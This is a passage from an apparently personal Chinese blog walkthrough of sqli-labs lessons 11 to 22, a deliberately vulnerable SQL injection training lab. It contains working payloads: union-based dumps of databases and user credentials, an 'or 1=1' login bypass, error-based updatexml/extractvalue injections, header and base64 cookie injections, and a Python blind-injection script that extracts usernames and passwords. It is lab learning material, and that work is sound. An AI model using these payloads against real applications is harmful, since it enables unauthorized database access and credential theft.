class="hljs-keyword">if</span> head != <span class="hljs-number">32</span>:        result += chr(head)    <span class="hljs-keyword">else</span>:        <span class="hljs-keyword">break</span>print(result)</code></pre><h3 id="Less11：POST报错注入字符型-单引号"><a href="#Less11：POST报错注入字符型-单引号" class="headerlink" title="Less11：POST报错注入字符型(单引号)"></a>Less11：POST报错注入字符型(单引号)</h3><p>发现登录界面，随便试错猜语句</p><p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210218002409207.png" alt="image-20210218002409207"></p><p>则语句：<code>uname=&#39;1&#39; and password=&#39;&#39; LIMIT 0,1</code></p><p>直接在登陆界面执行以下payload可以查询到数据库，表，账户密码信息</p><pre><code class="hljs mysql">MySQL中的所有数据库：-1&#39; union select 1,group_concat(schema_name)from information_schema.schemata #当前正在使用的数据库以及系统的所有信息-1&#39; union select 1,concat_ws(&#39;|&#39;,database(),version(),@@datadir,@@version_compile_os,user())  #爆出当前表名-1&#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database() #爆列名-1&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39; #爆出所有账户密码-1&#39; union select 1,group_concat(username,password) from users #</code></pre><p>或者是直接进后台得到一个账号密码：<code>1&#39; or 1=1 #</code></p><p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210218005003622.png" alt="image-20210218005003622"></p><h3 id="Less12：POST报错注入字符型-带单括号的单引号"><a href="#Less12：POST报错注入字符型-带单括号的单引号" class="headerlink" title="Less12：POST报错注入字符型(带单括号的单引号)"></a>Less12：POST报错注入字符型(带单括号的单引号)</h3><p>按less11的步骤来，只不过是以<code>&quot;)</code>闭合的</p><h3 id="Less13：POST字符型双查询-带括号的单引号"><a href="#Less13：POST字符型双查询-带括号的单引号" class="headerlink" title="Less13：POST字符型双查询(带括号的单引号)"></a>Less13：POST字符型双查询(带括号的单引号)</h3><p>利用方法参考less5。另外：</p><p>updatexml测试有回显：<code>111&#39;) and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)#</code></p><p>extractvalue也有回显：<code>111&#39;) and extractvalue(1,concat(0x7e,(select @@version),0x7e))#</code></p><h3 id="Less14：POST字符型双查询-带括号的单引号"><a href="#Less14：POST字符型双查询-带括号的单引号" class="headerlink" title="Less14：POST字符型双查询(带括号的单引号)"></a>Less14：POST字符型双查询(带括号的单引号)</h3><p>双查询没搞出来，但是用updatexml和extractvalue有回显</p><p>盲注：</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> requestsurl = <span class="hljs-string">&quot;url&quot;</span>result = <span class="hljs-string">&#x27;&#x27;</span>i = <span class="hljs-number">0</span><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:    i = i + <span class="hljs-number">1</span>    head = <span class="hljs-number">32</span>    tail = <span class="hljs-number">127</span>    <span class="hljs-keyword">while</span> head &lt; tail:        mid = (head + tail) &gt;&gt; <span class="hljs-number">1</span>        <span class="hljs-comment"># payload = f&#x27;hhh&quot; or 1=if(ascii(substr(database(),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)#&#x27;</span>        payload = <span class="hljs-string">f&#x27;hhh&quot; or 1=if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),<span class="hljs-subst">&#123;i&#125;</span>,1))&gt;<span class="hljs-subst">&#123;mid&#125;</span>,1,0)-- -&#x27;</span>        <span class="hljs-comment"># payload = f&#x27;hhh&quot; or 1=if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&quot;users&quot;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0) #&#x27;</span>        <span class="hljs-comment"># payload = f&#x27;hhh&quot; or 1=if(ascii(substr((select group_concat(username) from users),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0) #&#x27;</span>        <span class="hljs-comment"># payload = f&#x27;hhh&quot; or 1=if(ascii(substr((select group_concat(password) from users),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0) #&#x27;</span>        data = &#123;            <span class="hljs-string">&#x27;uname&#x27;</span>: <span class="hljs-string">&#x27;hhh&#x27;</span>,            <span class="hljs-string">&#x27;passwd&#x27;</span>: payload        &#125;        r = requests.post(url, data=data)        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-keyword">in</span> r.text:            head = mid + <span class="hljs-number">1</span>        <span class="hljs-keyword">else</span>:            tail = mid    <span class="hljs-keyword">if</span> head != <span class="hljs-number">32</span>:        result += chr(head)    <span class="hljs-keyword">else</span>:        <span class="hljs-keyword">break</span>print(result)</code></pre><h3 id="Less15：POST布尔-时间盲注-带单引号"><a href="#Less15：POST布尔-时间盲注-带单引号" class="headerlink" title="Less15：POST布尔/时间盲注(带单引号)"></a>Less15：POST布尔/时间盲注(带单引号)</h3><p>lesss14中的盲注双引号改为单引号即可</p><p>也可手动burp操作</p><p>例如猜数据库长度</p><p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210219011737775.png" alt="image-20210219011737775"></p><p>成功后响应时间变长</p><p>1’ and updatexml(1,concat(0x7e,(select @@version()),0x7e),1)#</p><h3 id="Less16：POST布尔-时间盲注-带双引号"><a href="#Less16：POST布尔-时间盲注-带双引号" class="headerlink" title="Less16：POST布尔/时间盲注(带双引号)"></a>Less16：POST布尔/时间盲注(带双引号)</h3><p>lesss14中的盲注脚本即可</p><h3 id="Less17：update"><a href="#Less17：update" class="headerlink" title="Less17：update"></a>Less17：update</h3><p>这一关难搞，试了半天的username，打开后台一瞅，好家伙全是转义。。。</p><p>如其名，猜测就是更新数据的，所以试一试updatexml，成了。</p><p>payload：<code>1&#39; and updatexml(1,concat(0x7e,(select version()),0x7e),1)#</code></p><p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210219122421671.png" alt="image-20210219122421671"></p><p>需要注意的是，既然是更新信息，那么所选择的username在数据库中要存在</p><h3 id="Less18：http-useragent注入"><a href="#Less18：http-useragent注入" class="headerlink" title="Less18：http-useragent注入"></a>Less18：http-useragent注入</h3><p>这一关要先知道账号密码，可以使用brup进行爆破得到，然后进行UA注入</p><p>payload：<code> &#39;and  updatexml(1,concat(0x7e,@@version,0x7e),1) or &#39;1&#39;=&#39;1</code></p><p>这里不直接注释掉是因为后台是先进行插入，再显示出来的。</p><p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210219164225757.png" alt="image-20210219164225757"></p><h3 id="Less19：http-refer注入"><a href="#Less19：http-refer注入" class="headerlink" title="Less19：http-refer注入"></a>Less19：http-refer注入</h3><p>和less18一样，在refer进行注入</p><p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210219164503461.png" alt="image-20210219164503461"></p><h3 id="Less20：cooike注入"><a href="#Less20：cooike注入" class="headerlink" title="Less20：cooike注入"></a>Less20：cooike注入</h3><p>找个账号登进去</p><p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210219173109251.png" alt="image-20210219173109251"></p><p>抓包修改cooike：<code>uname=admin&#39; and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)#</code></p><h3 id="less21：cookie-base64（带括号的单引号）"><a href="#less21：cookie-base64（带括号的单引号）" class="headerlink" title="less21：cookie-base64（带括号的单引号）"></a>less21：cookie-base64（带括号的单引号）</h3><p>瞅瞅，base64加密了，简单嘛，把上一关的payloadbase64一下就o了</p><p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210219181040717.png" alt="image-20210219181040717"></p><p>先试试闭合</p><p>尝试各种闭合之后发现<code>1&#39;) #</code>不会报错</p><p>payload：<code>uname=YWRtaW4xJylhbmQgdXBkYXRleG1sKDEsY29uY2F0KDB4N2UsKFNFTEVDVCBkYXRhYmFzZSgpKSwweDdlKSwxKSM=</code></p><p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210219185850820.png" alt="image-20210219185850820"></p><p>建议加解密到此网站：<a href="https://tool.oschina.net/encrypt?type=3%EF%BC%8C%E8%B8%A9%E4%BA%86%E5%BE%88%E5%A4%9A%E5%9D%91%E3%80%82%E3%80%82%E3%80%82">https://tool.oschina.net/encrypt?type=3，踩了很多坑。。。</a></p><h3 id="less22：cookie-base64（双引号）"><a href="#less22：cookie-base64（双引号）" class="headerlink" title="less22：cookie-base64（双引号）"></a>less22：cookie-base64（双引号）</h3><p>经过实验和less21只是闭合不一样，换成双引号就好了</p><p>​</p>]]></content>
    
    
    <categories>
      
      <category>web安全</category>
      
    </categories>
    
    
  </entry>
  
  
  
  
</search>
